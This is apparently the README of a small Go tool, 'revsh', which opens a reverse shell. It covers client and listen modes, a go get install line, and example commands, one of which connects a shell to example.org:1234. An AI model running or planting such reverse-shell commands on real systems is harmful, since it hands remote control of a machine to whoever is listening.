revsh
=====

revsh establishes a reverse shell connection using two modes.

The client mode (default) executes a shell and pipes it's I/O to ADDR.

The server mode ("-l" flag) binds incoming connections on ADDR with standard
input.

Usually the server mode is used at a local host while the client mode is used at
a remote host.

Installation
------------

	$ go get github.com/mewmew/playground/revsh

Documentation
-------------

Documentation provided by GoDoc.

- [revsh][]: Establish a reverse shell connection using two modes.

[revsh]: http://godoc.org/github.com/mewmew/playground/revsh

Usage
-----

	revsh [OPTION]... ADDR

Flags:

	-l (default=false)
		Listen for incoming connections.

Examples
--------

1. Listen on port 1234.

		revsh -l :1234

2. Connect to server at "example.org" on port 1234.

		revsh example.org:1234
